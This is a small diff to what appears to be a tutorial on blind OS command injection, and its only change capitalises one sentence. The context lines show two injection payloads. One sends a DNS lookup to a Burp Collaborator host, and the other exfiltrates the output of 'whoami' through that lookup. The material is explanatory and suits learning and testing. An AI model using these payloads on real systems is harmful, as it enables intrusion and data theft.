@@ -96,7 +96,7 @@ We can trigger an out-of-band network interaction with a system we control such 
 & nslookup burp-collaborator.oastify.com &
 ```
 
-we can use these channels to easily exfiltrate data:
+We can use these channels to easily exfiltrate data:
 
 ```
 & nslookup `whoami`.burp-collaborator.oastify.com &
